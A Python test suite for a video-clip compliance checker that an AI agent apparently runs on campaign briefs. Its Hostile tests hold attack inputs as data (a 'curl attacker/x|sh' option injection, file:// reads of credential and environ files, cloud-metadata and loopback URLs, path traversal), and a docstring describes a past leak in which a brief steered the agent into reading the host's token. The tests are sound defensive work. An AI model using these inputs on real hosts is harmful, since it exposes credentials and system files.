"""What the checker must never get wrong.

Every case here is a way a real submission has been thrown out: a second over
the limit, a missing tag, a scratch track on a campaign that adds its own sound.
The point of the suite is that these fail loudly in a build rather than quietly
in a payout.
"""
import json
import os
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(HERE), "warden-shared", "scripts"))

WARDEN_DIR = tempfile.mkdtemp(prefix="warden-tests-")
os.environ["WARDEN_DIR"] = WARDEN_DIR

import warden
import warden_rules as R


def rules(**over):
    base = R.blank()
    base.update({"id": "test", "name": "Test campaign", "schema": 1})
    base["video"].update({"duration_min_s": 10, "duration_max_s": 30,
                          "width": 1080, "height": 1920, "aspect": "9:16",
                          "audio": "forbidden"})
    base["caption"].update({"required_hashtags": ["#AD"],
                            "required_mentions": ["@brand"],
                            "banned_terms": ["aposta"]})
    for key, value in over.items():
        if isinstance(value, dict) and isinstance(base.get(key), dict):
            base[key].update(value)
        else:
            base[key] = value
    return base


def media(**over):
    base = {"width": 1080, "height": 1920, "duration_s": 20.0,
            "audio_codec": None, "size_mb": 9.0, "codec": "h264"}
    base.update(over)
    return base


def levels(findings, level):
    return [m for lv, m in findings if lv == level]


class RuleSet(unittest.TestCase):
    def test_template_validates(self):
        good = rules()
        self.assertEqual(R.validate(good), [])

    def test_typo_in_a_key_is_caught(self):
        broken = rules()
        broken["video"]["duration_max"] = 30          # the real key is duration_max_s
        self.assertTrue(any("duration_max" in p for p in R.validate(broken)))

    def test_inverted_window_is_caught(self):
        broken = rules(video={"duration_min_s": 40, "duration_max_s": 10})
        self.assertTrue(any("above" in p for p in R.validate(broken)))

    def test_hashtag_without_hash(self):
        broken = rules(caption={"required_hashtags": ["AD"]})
        self.assertTrue(any("does not start with #" in p for p in R.validate(broken)))


class Checking(unittest.TestCase):
    def test_a_clean_clip_passes(self):
        found = warden.check(rules(), media(), "hook @brand #AD", [])
        self.assertEqual(warden.verdict(found), warden.OK)

    def test_one_second_over_is_a_reject(self):
        found = warden.check(rules(), media(duration_s=30.4), "@brand #AD", [])
        self.assertEqual(warden.verdict(found), warden.REPROVA)
        self.assertTrue(any("over the 30s maximum" in m for m in levels(found, warden.REPROVA)))

    def test_under_the_minimum_is_a_reject(self):
        found = warden.check(rules(), media(duration_s=8), "@brand #AD", [])
        self.assertEqual(warden.verdict(found), warden.REPROVA)

    def test_wrong_resolution_is_a_reject(self):
        found = warden.check(rules(), media(width=720, height=1280), "@brand #AD", [])
        self.assertTrue(any("1080x1920" in m for m in levels(found, warden.REPROVA)))

    def test_scratch_audio_when_the_platform_adds_the_sound(self):
        found = warden.check(rules(), media(audio_codec="aac"), "@brand #AD", [])
        self.assertTrue(any("audio track" in m for m in levels(found, warden.REPROVA)))

    def test_missing_hashtag(self):
        found = warden.check(rules(), media(), "just a hook @brand", [])
        self.assertTrue(any("#AD" in m for m in levels(found, warden.REPROVA)))

    def test_case_and_accents_do_not_smuggle_a_banned_word(self):
        found = warden.check(rules(), media(), "APOSTÁ @brand #AD", [])
        self.assertTrue(any("bans" in m for m in levels(found, warden.REPROVA)))

    def test_tags_match_regardless_of_case(self):
        found = warden.check(rules(), media(), "@Brand #ad", [])
        self.assertEqual(warden.verdict(found), warden.OK)

    def test_the_cap_stops_free_work(self):
        capped = rules(posting={"per_clipper_cap": 2})
        found = warden.check(capped, media(), "@brand #AD", [{}, {}])
        self.assertTrue(any("cap is 2" in m for m in levels(found, warden.REPROVA)))

    def test_a_closed_campaign_is_a_reject(self):
        closed = rules(posting={"deadline": "2020-01-01"})
        found = warden.check(closed, media(), "@brand #AD", [])
        self.assertTrue(any("closed on" in m for m in levels(found, warden.REPROVA)))

    def test_silence_of_the_brief_is_reported_not_invented(self):
        quiet = R.blank()
        quiet.update({"id": "quiet", "schema": 1})
        quiet["unknown"] = ["whether edits may carry an embedded track"]
        found = warden.check(quiet, media(), None, [])
        self.assertEqual(warden.verdict(found), warden.OK)
        self.assertTrue(any("does not settle it" in m for m in levels(found, warden.ATENCAO)))

    def test_source_rules_are_never_claimed_as_checked(self):
        sourced = rules(sources={"allowed": ["the official archive"]})
        found = warden.check(sourced, media(), "@brand #AD", [])
        self.assertTrue(any("only you can confirm" in m for m in levels(found, warden.ATENCAO)))
        self.assertFalse(any("only you can confirm" in m for m in levels(found, warden.OK)))


class Packaging(unittest.TestCase):
    def test_the_caption_carries_what_the_brief_demands(self):
        path = warden.campaign_path("pack")
        packed = rules(id="pack", caption={"required_text": ["Season 4 now streaming"]})
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as fh:
            json.dump(packed, fh)
        import io
        from contextlib import redirect_stdout
        buffer = io.StringIO()
        with redirect_stdout(buffer):
            warden.main(["package", "--campaign", "pack", "--hook", "pov: he inherited it"])
        caption = buffer.getvalue()
        self.assertIn("pov: he inherited it", caption)
        self.assertIn("Season 4 now streaming", caption)
        self.assertIn("@brand", caption)
        self.assertIn("#AD", caption)

    def test_the_packaged_caption_passes_its_own_check(self):
        import io
        from contextlib import redirect_stdout
        buffer = io.StringIO()
        with redirect_stdout(buffer):
            warden.main(["package", "--campaign", "pack", "--hook", "pov: he inherited it"])
        found = warden.check(rules(), media(), buffer.getvalue(), [])
        self.assertEqual(warden.verdict(found), warden.OK)


if __name__ == "__main__":
    unittest.main(verbosity=2)


class Preferences(unittest.TestCase):
    """Taste is asked once, and the campaign still wins."""

    def setUp(self):
        import warden_prefs
        self.P = warden_prefs
        self.dir = tempfile.mkdtemp(prefix="warden-prefs-")

    def test_nothing_stored_means_everything_is_asked(self):
        self.assertEqual(self.P.missing({}), self.P.KEYS)

    def test_an_answer_is_never_asked_again(self):
        self.assertNotIn("delivery", self.P.missing({"delivery": "edit"}))

    def test_the_campaign_overrules_the_sound_and_says_so(self):
        settings, overruled = self.P.effective({"sound": "embedded"}, rules())
        self.assertEqual(settings["sound"], "platform")
        self.assertTrue(overruled)

    def test_the_campaign_caps_a_length_the_owner_asked_for(self):
        settings, overruled = self.P.effective({"target_s": 90}, rules())
        self.assertEqual(settings["target_s"], 30)
        self.assertTrue(any("caps a clip" in reason for reason in overruled))

    def test_a_length_inside_the_window_is_left_alone(self):
        settings, overruled = self.P.effective({"target_s": 25}, rules())
        self.assertEqual(settings["target_s"], 25)
        self.assertEqual(overruled, [])

    def test_preferences_survive_a_write_and_a_read(self):
        self.P.save(self.dir, {"delivery": "cuts", "batch": 5})
        self.assertEqual(self.P.load(self.dir)["batch"], 5)

    def test_every_question_has_a_default_and_every_default_a_question(self):
        self.assertEqual(sorted(self.P.DEFAULTS), sorted(self.P.KEYS))


class Beat(unittest.TestCase):
    """A cut lands on a bar, and never outside the campaign's window."""

    def setUp(self):
        import warden_beat
        self.B = warden_beat

    def test_snaps_to_the_nearest_whole_bar(self):
        length, bars = self.B.snap(17.3, 2.7842, 10, 60)
        self.assertEqual(bars, 6)
        self.assertAlmostEqual(length, 6 * 2.7842, places=2)

    def test_never_snaps_past_the_campaign_maximum(self):
        length, bars = self.B.snap(29.5, 2.7842, 10, 30)
        self.assertLessEqual(length, 30)
        self.assertEqual(bars, 10)

    def test_never_snaps_under_the_campaign_minimum(self):
        length, bars = self.B.snap(9.0, 2.7842, 20, 60)
        self.assertGreaterEqual(length, 20)

    def test_says_so_when_no_bar_count_fits(self):
        length, bars = self.B.snap(10, 9.0, 10, 12)     # a bar is longer than the window
        self.assertIsNone(length)

    def test_a_missing_grid_leaves_the_length_alone(self):
        length, bars = self.B.snap(17.3, 0, 10, 60)
        self.assertEqual(length, 17.3)
        self.assertIsNone(bars)


class ModelChoice(unittest.TestCase):
    """The transcription model is chosen by what the source costs."""

    def setUp(self):
        import warden_media
        self.M = warden_media
        self.saved = os.environ.pop("WARDEN_WHISPER", None)

    def tearDown(self):
        if self.saved is not None:
            os.environ["WARDEN_WHISPER"] = self.saved

    def test_a_short_source_gets_the_better_model(self):
        size, why = self.M.pick_model(300)
        self.assertEqual(size, "small")

    def test_a_long_source_gets_the_faster_model(self):
        size, why = self.M.pick_model(3600)
        self.assertEqual(size, "base")
        self.assertIn("minutes", why)

    def test_an_override_always_wins(self):
        os.environ["WARDEN_WHISPER"] = "medium"
        size, why = self.M.pick_model(3600)
        self.assertEqual(size, "medium")
        self.assertIn("WARDEN_WHISPER", why)

    def test_an_unknown_duration_does_not_downgrade(self):
        size, _ = self.M.pick_model(None)
        self.assertEqual(size, "small")


class Saving(unittest.TestCase):
    """A rule set is stored or the agent is told plainly that it is not."""

    def test_empty_input_is_refused_loudly(self):
        import io
        from contextlib import redirect_stderr
        err = io.StringIO()
        with redirect_stderr(err), self.assertRaises(SystemExit) as caught:
            warden.main(["campaign", "save", "--json", "   "])
        self.assertEqual(caught.exception.code, 2)
        self.assertIn("do not report this campaign as stored", err.getvalue())

    def test_a_saved_rule_set_reads_back(self):
        import io
        from contextlib import redirect_stdout
        out = io.StringIO()
        payload = json.dumps({"schema": 1, "id": "roundtrip", "name": "Round trip",
                              "video": {"duration_max_s": 30}})
        with redirect_stdout(out):
            warden.main(["campaign", "save", "--json", payload])
        self.assertIn("stored and verified", out.getvalue())
        self.assertEqual(warden.load_campaign("roundtrip")["name"], "Round trip")


class StateLocation(unittest.TestCase):
    """Where state lives is never a mystery, because two people looking at two
    directories is how an agent gets accused of lying."""

    def test_status_names_the_source_of_the_path(self):
        import io
        from contextlib import redirect_stdout
        out = io.StringIO()
        with redirect_stdout(out):
            warden.main(["status"])
        text = out.getvalue()
        self.assertIn("WARDEN_DIR in the environment", text)
        self.assertIn("writable:", text)


class Delivery(unittest.TestCase):
    """A clip nobody can open is the same as no clip.

    The runtime attaches a file only from a short list of directories, and the
    one this agent's state lives in is not on it. These pin the two halves of
    that: where a render lands, and the line that hands it over.
    """

    def test_a_bare_filename_lands_in_the_deliverable_directory(self):
        got = warden.clip_out("clip-01.mp4")
        self.assertEqual(os.path.dirname(got),
                         os.path.realpath(warden.clips_dir()))

    def test_the_deliverable_directory_is_a_place_this_agent_may_write(self):
        inside = os.path.join(warden.clips_dir(), "clip.mp4")
        self.assertEqual(warden.safe_out(inside, "clip"), os.path.realpath(inside))

    def test_a_full_path_outside_is_still_refused(self):
        with self.assertRaises(SystemExit):
            warden.clip_out("/etc/anything.mp4")

    def test_in_the_image_the_directory_is_the_one_the_runtime_allows(self):
        """/var/lib is denied by the runtime's media validator and
        /var/lib/hermes/cache/videos is allowlisted back in ahead of it. The
        path is not ours to choose, so it is pinned here rather than described
        in a comment somebody can edit."""
        seen = []
        real_isdir, real_makedirs = os.path.isdir, os.makedirs
        os.environ.pop("WARDEN_DIR", None)
        try:
            os.path.isdir = lambda p: True if p == "/var/lib/hermes" else real_isdir(p)
            os.makedirs = lambda p, **kw: seen.append(p)
            self.assertEqual(warden.clips_dir(), "/var/lib/hermes/cache/videos")
        finally:
            os.path.isdir, os.makedirs = real_isdir, real_makedirs
            os.environ["WARDEN_DIR"] = WARDEN_DIR
        self.assertEqual(seen, ["/var/lib/hermes/cache/videos"])


class Framing(unittest.TestCase):
    """A landscape source cropped to 9:16 keeps a band, and the default centre
    is a guess. These pin the lever the agent uses when the guess is wrong."""

    def setUp(self):
        import warden_media
        self.M = warden_media

    def test_crop_names_map_to_left_centre_right(self):
        self.assertEqual(self.M._crop_fraction(None), 0.5)
        self.assertEqual(self.M._crop_fraction("center"), 0.5)
        self.assertLess(self.M._crop_fraction("left"), 0.5)
        self.assertGreater(self.M._crop_fraction("right"), 0.5)

    def test_a_percentage_places_the_band(self):
        self.assertEqual(self.M._crop_fraction("0"), 0.0)
        self.assertEqual(self.M._crop_fraction("100"), 1.0)
        self.assertAlmostEqual(self.M._crop_fraction("25"), 0.25)

    def test_a_crop_that_is_not_a_place_is_refused(self):
        for bad in ("middle", "-5", "150", "left;rm"):
            with self.assertRaises(RuntimeError):
                self.M._crop_fraction(bad)


class Hostile(unittest.TestCase):
    """Everything here arrives from a stranger: the brief is pasted, the archive
    links are read off a web page, the file names come from a remote server."""

    def setUp(self):
        import warden_media
        self.M = warden_media

    def test_a_brief_cannot_smuggle_a_command_line_option(self):
        with self.assertRaises(RuntimeError):
            self.M.safe_url("--exec=curl attacker/x|sh")

    def test_a_brief_cannot_read_the_host_filesystem(self):
        with self.assertRaises(RuntimeError):
            self.M.safe_url("file:///var/lib/plow/credentials")

    def test_only_http_and_https_are_links(self):
        for bad in ("ftp://x/y.mp4", "data:video/mp4;base64,AAA", "javascript:1", ""):
            with self.assertRaises(RuntimeError):
                self.M.safe_url(bad)
        self.assertTrue(self.M.safe_url("https://drive.google.com/file/d/a/view"))

    def test_a_brief_cannot_send_the_agent_to_read_its_own_host(self):
        """The credential leak that was live: `warden fetch file:///proc/<gw>/environ`
        read the host's Plow token, because fetch never went through safe_url.
        And a link-local http URL is the cloud metadata service. Both are the
        host's own surface, and a brief cannot be allowed to name them."""
        for internal in ("file:///etc/passwd", "file:///proc/1/environ",
                         "http://169.254.169.254/latest/meta-data/",
                         "http://127.0.0.1/", "http://localhost/",
                         "http://10.0.0.1/", "http://[::1]/"):
            with self.assertRaises(RuntimeError, msg=internal):
                self.M.safe_url(internal)

    def test_fetch_text_refuses_the_same_way_archive_does(self):
        """The hole was that safe_url guarded archive but not fetch. fetch_text
        must refuse file:// before it opens anything -- the read is the leak."""
        with self.assertRaises(RuntimeError):
            self.M.fetch_text("file:///etc/passwd")

    def test_a_redirect_is_checked_like_the_first_hop(self):
        """urllib refuses a redirect to file:// on its own, but follows one to a
        link-local http address without a word. The guard runs safe_url on the
        redirect target, so an internal redirect is refused with the same
        message rather than followed."""
        handler = self.M._GuardedRedirect()
        with self.assertRaises(RuntimeError):
            handler.redirect_request(None, None, 302, "Found", {},
                                     "http://169.254.169.254/x")

    def test_a_playlist_link_is_bounded_and_the_output_is_deterministic(self):
        """The bug the agent hit: --no-playlist on a real playlist URL left a
        stray intermediate, and videos[0] over an unordered listdir sometimes
        returned it instead of the merged file. So it picked the wrong file and
        a human 'corrected it manually', which is the archive being bypassed.
        A playlist link is now pulled as a playlist bounded to one item and
        capped per file, and the merged stem.mp4 is chosen over any residue."""
        import tempfile
        calls = {}
        out_dir = tempfile.mkdtemp(prefix="warden-dl-")

        def fake_run(args, timeout, label):
            calls["args"] = args
            stem = next(a.split(os.sep)[-1].split(".")[0]
                        for a in args if "source-" in a)
            # A partial merge left an intermediate with the same prefix, listed
            # (by chance) before the merged output.
            open(os.path.join(out_dir, stem + ".f251.webm"), "wb").write(b"x")
            open(os.path.join(out_dir, stem + ".mp4"), "wb").write(b"x")
            return ""

        real_run, real_have = self.M.run, self.M.have
        self.M.run = fake_run
        self.M.have = lambda b: True
        try:
            got = self.M._download_one(
                "https://youtube.com/playlist?list=PLabc", out_dir)
        finally:
            self.M.run, self.M.have = real_run, real_have

        self.assertTrue(got.endswith(".mp4"), got)
        self.assertNotIn(".f251.", got)
        self.assertIn("--max-filesize", calls["args"])
        self.assertIn("--playlist-items", calls["args"])
        self.assertNotIn("--no-playlist", calls["args"])

    def test_a_single_video_link_stays_no_playlist(self):
        import tempfile
        calls = {}
        out_dir = tempfile.mkdtemp(prefix="warden-dl-")

        def fake_run(args, timeout, label):
            calls["args"] = args
            stem = next(a.split(os.sep)[-1].split(".")[0]
                        for a in args if "source-" in a)
            open(os.path.join(out_dir, stem + ".mp4"), "wb").write(b"x")
            return ""

        real_run, real_have = self.M.run, self.M.have
        self.M.run = fake_run
        self.M.have = lambda b: True
        try:
            self.M._download_one("https://www.youtube.com/watch?v=abc123", out_dir)
        finally:
            self.M.run, self.M.have = real_run, real_have
        self.assertIn("--no-playlist", calls["args"])
        self.assertNotIn("--yes-playlist", calls["args"])

    def test_a_campaign_id_cannot_walk_out_of_its_directory(self):
        for bad in ("../../etc/passwd", "a/b", "..", "x\x00y"):
            with self.assertRaises(SystemExit):
                warden.safe_id(bad)
        self.assertEqual(warden.safe_id("prime-video_2026"), "prime-video_2026")

    def test_output_stays_inside_the_agents_own_directories(self):
        with self.assertRaises(SystemExit):
            warden.safe_out("/etc/anything.mp4", "clip")
        inside = os.path.join(warden.state_dir(), "clip.mp4")
        self.assertEqual(warden.safe_out(inside, "clip"), os.path.realpath(inside))

    def test_a_rejected_duration_is_decided_by_level_not_by_wording(self):
        found = warden.check(rules(), media(duration_s=45), "@brand #AD", [])
        self.assertEqual(warden.verdict(found), warden.REPROVA)
        self.assertFalse(any(lv == warden.OK and m.startswith("duration")
                             for lv, m in found))
